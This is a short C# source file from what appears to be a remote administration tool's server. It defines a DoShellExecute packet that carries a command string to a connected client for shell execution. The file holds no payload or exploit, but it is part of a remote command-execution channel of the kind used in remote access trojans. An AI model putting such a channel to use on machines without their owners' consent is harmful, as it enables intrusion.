using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoShellExecute : IPacket
    {
        public string Command { get; set; }

        public DoShellExecute()
        {
        }

        public DoShellExecute(string command)
        {
            this.Command = command;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}